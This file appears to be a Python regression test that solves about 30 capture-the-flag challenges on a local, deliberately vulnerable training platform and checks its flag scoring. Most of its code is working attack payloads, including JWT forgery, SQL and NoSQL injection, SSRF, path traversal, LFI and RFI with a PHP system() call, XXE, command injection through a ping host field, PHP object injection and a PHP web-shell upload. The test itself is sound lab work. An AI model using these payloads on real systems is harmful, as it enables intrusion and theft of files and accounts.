#!/usr/bin/env python3
import concurrent.futures
import re
import subprocess
import sys
import time
import urllib.parse
import uuid
from pathlib import Path

import jwt
import requests

ROOT = Path(__file__).resolve().parents[2]
BASE = "http://127.0.0.1:4000"
FLAG_RE = re.compile(r"MV\{[^}]+\}")
BASE_SOLVED = {"jwt-alg-none", "jwt-weak-secret", "sqli-auth-bypass"}

RESULTS = []
FLAGS = {}


def env_value(name, default):
    path = ROOT / ".env"
    if path.exists():
        for line in path.read_text(encoding="utf-8").splitlines():
            if line.startswith(name + "="):
                return line.split("=", 1)[1].strip()
    return default


JWT_SECRET = env_value("JWT_SECRET", "weak-jwt-secret")


def reset_state():
    subprocess.run(["bash", "tests/reset_state.sh"], cwd=ROOT, check=True)


def login(username, password):
    response = requests.post(
        BASE + "/api/auth/login",
        json={"username": username, "password": password},
        timeout=15,
    )
    response.raise_for_status()
    return response.json()


def register(prefix, password="pass12345"):
    username = f"qa_{prefix}_{uuid.uuid4().hex[:6]}"
    email = username + "@academy.local"
    response = requests.post(
        BASE + "/api/auth/register",
        json={"username": username, "email": email, "password": password},
        timeout=15,
    )
    response.raise_for_status()
    return username, email, password, response.json()["access_token"]


def extract_flag(text):
    match = FLAG_RE.search(text or "")
    if not match:
        raise AssertionError(f"flag not found in response: {(text or '')[:200]}")
    return match.group(0)


def submit(slug, flag, token):
    response = requests.post(
        BASE + f"/api/academy/challenges/{slug}/solve",
        headers={"Authorization": "Bearer " + token},
        json={"flag": flag},
        timeout=15,
    )
    if response.status_code != 200:
        raise AssertionError(f"submit {slug}: {response.status_code} {response.text}")
    return response.json()


def record(slug, runner, token):
    try:
        flag = runner()
        if not flag:
            raise AssertionError("empty flag")
        result = submit(slug, flag, token)
        if not result.get("solved"):
            raise AssertionError(f"flag not accepted: {result}")
        FLAGS[slug] = flag
        RESULTS.append((slug, "PASS", ""))
        print(f"PASS {slug}")
    except Exception as error:
        RESULTS.append((slug, "FAIL", str(error)))
        print(f"FAIL {slug}: {error}")


def api_json(method, path, token=None, **kwargs):
    headers = kwargs.pop("headers", {})
    if token:
        headers["Authorization"] = "Bearer " + token
    response = requests.request(method, BASE + path, headers=headers, timeout=30, **kwargs)
    return response


def main():
    reset_state()

    try:
        session = login("student", "student123")
        token = session["access_token"]
        student_id = session["user"]["id"]

        def jwt_alg_none():
            forged = jwt.encode(
                {"sub": student_id, "username": "student", "role": "admin"},
                key=None,
                algorithm="none",
            )
            response = requests.get(
                BASE + "/api/auth/me",
                headers={"Authorization": "Bearer " + forged},
                timeout=15,
            )
            return response.json().get("flag")

        def jwt_weak_secret():
            forged = jwt.encode(
                {"sub": student_id, "username": "student", "role": "admin"},
                JWT_SECRET,
                algorithm="HS256",
            )
            response = requests.get(
                BASE + "/api/auth/me",
                headers={"Authorization": "Bearer " + forged},
                timeout=15,
            )
            return response.json().get("flag")

        def sql_injection():
            response = requests.post(
                BASE + "/api/auth/login",
                json={"username": "admin'--", "password": "x"},
                timeout=15,
            )
            return response.json().get("flag")

        def mass_assignment():
            _, _, _, user_token = register("mass")
            response = requests.patch(
                BASE + "/api/auth/profile",
                headers={"Authorization": "Bearer " + user_token},
                json={"role": "admin"},
                timeout=15,
            )
            return response.json().get("flag")

        def brute_force():
            for _ in range(20):
                requests.post(
                    BASE + "/api/auth/login",
                    json={"username": "student", "password": "definitely-wrong"},
                    timeout=15,
                )
            response = requests.post(
                BASE + "/api/auth/login",
                json={"username": "student", "password": "student123"},
                timeout=15,
            )
            payload = response.json()
            return next(
                (item for item in payload.get("flags", []) if "BRUTE" in item),
                payload.get("flag"),
            )

        def open_redirect():
            response = requests.get(
                BASE + "/api/auth/login",
                params={"next": "//evil.example/phish"},
                allow_redirects=False,
                timeout=15,
            )
            return response.headers.get("X-Challenge-Flag")

        def reset_poisoning():
            username, email, password, user_token = register("reset")
            attacker = register("attacker")[0]
            requests.post(
                BASE + "/api/auth/forgot-password",
                json={"email": email},
                headers={"Host": "evil.example"},
                timeout=15,
            )
            mailbox = requests.get(
                BASE + "/api/auth/mailbox",
                params={"email": email},
                timeout=15,
            ).json()
            link = mailbox["messages"][0]["link"]
            reset_token = urllib.parse.parse_qs(
                urllib.parse.urlparse(link).query
            )["token"][0]
            response = requests.post(
                BASE + "/api/auth/reset",
                json={"token": reset_token, "new_password": "rotated123"},
                timeout=15,
            )
            return response.json().get("flag")

        def session_fixation():
            client = requests.Session()
            sid = "qa-fixed-" + uuid.uuid4().hex[:10]
            client.get(BASE + "/api/auth/session", params={"sid": sid}, timeout=15)
            client.post(
                BASE + "/api/auth/login",
                json={"username": "student", "password": "student123"},
                timeout=15,
            )
            response = client.get(BASE + "/api/auth/session", timeout=15)
            return response.json().get("flag")

        record("jwt-alg-none", jwt_alg_none, token)
        record("jwt-weak-secret", jwt_weak_secret, token)
        record("sqli-auth-bypass", sql_injection, token)
        record("mass-assignment-role", mass_assignment, token)
        record("brute-force-login", brute_force, token)
        record("open-redirect-login", open_redirect, token)
        record("password-reset-poisoning", reset_poisoning, token)
        record("session-fixation", session_fixation, token)

        def graphql_introspection():
            response = api_json(
                "POST",
                "/graphql",
                json={"query": "{ systemDiagnostics { flag } }"},
            )
            return response.json()["data"]["systemDiagnostics"]["flag"]

        def graphql_batching():
            operations = [{"query": "{ __typename }"} for _ in range(200)]
            response = api_json("POST", "/graphql", json=operations)
            return response.json()["results"][0]["extensions"]["flag"]

        def prototype_pollution():
            api_json(
                "POST",
                "/api/profile/merge",
                json={"__proto__": {"isAdmin": True}},
            )
            response = api_json("GET", "/api/admin/summary")
            return response.json().get("flag")

        def ssrf():
            response = api_json(
                "POST",
                "/api/images/parse",
                json={"imageUrl": "http://stats-service:8000/debug"},
            )
            return response.json().get("flag")

        def cors():
            client = requests.Session()
            client.post(
                BASE + "/api/session/login",
                json={"username": "student", "password": "student123"},
                timeout=15,
            )
            response = client.get(
                BASE + "/api/admin/flag",
                headers={"Origin": "https://evil.example"},
                timeout=15,
            )
            return response.json().get("flag")

        def graphql_idor():
            response = api_json(
                "POST",
                "/graphql",
                token=token,
                json={"query": "{ order(id: 1) { flag } }"},
            )
            return response.json()["data"]["order"]["flag"]

        def nosql_bypass():
            response = api_json(
                "POST",
                "/api/partner/login",
                json={"username": {"$ne": None}, "password": {"$ne": None}},
            )
            return response.json().get("flag")

        def nosql_blind():
            response = api_json(
                "POST",
                "/api/partner/login",
                json={
                    "username": "admin",
                    "password": {"$regex": "^VaultAdmin#2026$"},
                },
            )
            return response.json().get("flag")

        def cache_poisoning():
            api_json(
                "GET",
                "/api/landing",
                headers={"X-Forwarded-Host": "evil.example"},
            )
            response = api_json("GET", "/api/landing")
            return extract_flag(response.text)

        record("graphql-introspection", graphql_introspection, token)
        record("graphql-batching-dos", graphql_batching, token)
        record("prototype-pollution", prototype_pollution, token)
        record("ssrf-image-fetch", ssrf, token)
        record("cors-wildcard-credentials", cors, token)
        record("graphql-idor", graphql_idor, token)
        record("nosql-auth-bypass", nosql_bypass, token)
        record("nosql-blind", nosql_blind, token)
        record("cache-poisoning", cache_poisoning, token)

        def inventory_idor():
            response = api_json(
                "GET", "/api/inventory/orders/1", token=token
            )
            return response.json().get("flag")

        def inventory_race():
            def redeem(_):
                try:
                    response = requests.post(
                        BASE + "/api/inventory/redeem",
                        headers={"Authorization": "Bearer " + token},
                        json={"amount": 1000},
                        timeout=20,
                    )
                    return response.json().get("flag")
                except Exception:
                    return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
                flags = list(pool.map(redeem, range(30)))
            return next((flag for flag in flags if flag), None)

        def inventory_traversal():
            response = api_json(
                "GET",
                "/api/inventory/files",
                params={"name": "../../../../var/www/flags/inventory.txt"},
            )
            return extract_flag(response.text)

        record("inventory-idor", inventory_idor, token)
        record("inventory-race-condition", inventory_race, token)
        record("inventory-path-traversal", inventory_traversal, token)

        def legacy_lfi():
            response = api_json(
                "GET",
                "/legacy/report.php",
                params={"page": "../../flags/lfi.txt"},
            )
            return extract_flag(response.text)

        def legacy_rfi():
            payload = "data://text/plain,<?php system('cat /var/www/flags/rfi.txt');?>"
            response = api_json(
                "GET", "/legacy/template.php", params={"page": payload}
            )
            return extract_flag(response.text)

        def legacy_xxe():
            body = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///var/www/flags/xxe.txt">]>'
                "<invoice><note>&xxe;</note></invoice>"
            )
            response = api_json(
                "POST",
                "/legacy/import.php",
                data=body.encode(),
                headers={"Content-Type": "application/xml"},
            )
            return extract_flag(response.text)

        def legacy_command_injection():
            response = api_json(
                "GET",
                "/legacy/ping.php",
                params={"host": "127.0.0.1;cat /var/www/flags/cmd.txt"},
            )
            return extract_flag(response.text)

        def legacy_object_injection():
            payload = (
                'O:9:"CacheFile":1:{s:4:"path";s:30:'
                '"/var/www/flags/unserialize.txt";}'
            )
            encoded = urllib.parse.quote(payload, safe="")
            response = api_json(
                "GET",
                "/legacy/dashboard.php",
                headers={"Cookie": "prefs=" + encoded},
            )
            return extract_flag(response.text)

        def legacy_upload():
            shell = b"<?php echo file_get_contents('/var/www/flags/upload.txt'); ?>"
            response = api_json(
                "POST",
                "/legacy/upload.php",
                files={"file": ("shell.php", shell, "application/x-php")},
            )
            path = response.json()["gateway"]
            executed = api_json("GET", path)
            return extract_flag(executed.text)

        record("legacy-lfi", legacy_lfi, token)
        record("legacy-rfi", legacy_rfi, token)
        record("legacy-xxe", legacy_xxe, token)
        record("legacy-command-injection", legacy_command_injection, token)
        record("legacy-php-object-injection", legacy_object_injection, token)
        record("legacy-upload-php", legacy_upload, token)

        frontend_client = requests.Session()
        frontend_client.post(
            BASE + "/api/session/login",
            json={"username": "student", "password": "student123"},
            timeout=15,
        )

        def bootstrap_cookie(page, name):
            response = frontend_client.get(
                BASE + "/api/frontend/bootstrap",
                params={"page": page},
                timeout=15,
            )
            value = response.cookies.get(name)
            return urllib.parse.unquote(value) if value else None

        def dom_xss():
            return bootstrap_cookie("search", "dom_xss_flag")

        def postmessage_xss():
            return bootstrap_cookie("support", "pm_xss_flag")

        def csrf_profile_change():
            response = frontend_client.post(
                BASE + "/api/profile/email",
                json={"email": "qa_csrf@academy.local"},
                headers={"Origin": "https://evil.example"},
                timeout=15,
            )
            return response.json().get("flag")

        def clickjacking_checkout():
            response = frontend_client.post(
                BASE + "/api/checkout/confirm",
                json={"framed": True},
                timeout=15,
            )
            return response.json().get("flag")

        record("dom-xss", dom_xss, token)
        record("csrf-profile-change", csrf_profile_change, token)
        record("clickjacking-checkout", clickjacking_checkout, token)
        record("postmessage-xss", postmessage_xss, token)

        catalog = api_json(
            "GET", "/api/academy/challenges", token=token
        ).json()["challenges"]
        if len(catalog) != 30:
            RESULTS.append(("catalog", "FAIL", f"expected 30 challenges, got {len(catalog)}"))

        progress = api_json("GET", "/api/academy/progress", token=token).json()
        if progress["solved"] != 30:
            RESULTS.append(("progress", "FAIL", f"expected 30 solved, got {progress['solved']}"))

        wrong = requests.post(
            BASE + "/api/academy/challenges/dom-xss/solve",
            headers={"Authorization": "Bearer " + token},
            json={"flag": "MV{wrong}"},
            timeout=15,
        )
        if wrong.status_code != 400:
            RESULTS.append(("wrong-flag", "FAIL", wrong.text))
        else:
            RESULTS.append(("wrong-flag", "PASS", ""))

        double = submit("ssrf-image-fetch", FLAGS["ssrf-image-fetch"], token)
        if not double.get("solved"):
            RESULTS.append(("idempotent-solve", "FAIL", str(double)))
        else:
            RESULTS.append(("idempotent-solve", "PASS", ""))

        def parallel_solve(_):
            return requests.post(
                BASE + "/api/academy/challenges/cache-poisoning/solve",
                headers={"Authorization": "Bearer " + token},
                json={"flag": FLAGS["cache-poisoning"]},
                timeout=20,
            ).status_code

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            codes = list(pool.map(parallel_solve, range(10)))
        if set(codes) != {200}:
            RESULTS.append(("parallel-solve", "FAIL", str(codes)))
        else:
            RESULTS.append(("parallel-solve", "PASS", ""))

    finally:
        reset_state()

    baseline = login("student", "student123")
    baseline_token = baseline["access_token"]
    progress = api_json(
        "GET", "/api/academy/progress", token=baseline_token
    ).json()
    if progress["solved"] != 3:
        RESULTS.append(("state-reset", "FAIL", f"solved={progress['solved']}"))
    else:
        RESULTS.append(("state-reset", "PASS", ""))

    wallet = api_json(
        "GET", "/api/inventory/wallet", token=baseline_token
    ).json()
    if wallet.get("balance") != 10000:
        RESULTS.append(("wallet-reset", "FAIL", str(wallet)))
    else:
        RESULTS.append(("wallet-reset", "PASS", ""))

    failed = [item for item in RESULTS if item[1] == "FAIL"]
    passed = [item for item in RESULTS if item[1] == "PASS"]
    skipped = [item for item in RESULTS if item[1] == "SKIP"]

    print()
    print(
        f"TOTAL {len(RESULTS)} | PASS {len(passed)} | SKIP {len(skipped)} | FAIL {len(failed)}"
    )
    for slug, status, detail in RESULTS:
        if status == "FAIL":
            print(f"  {status} {slug}: {detail}")

    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())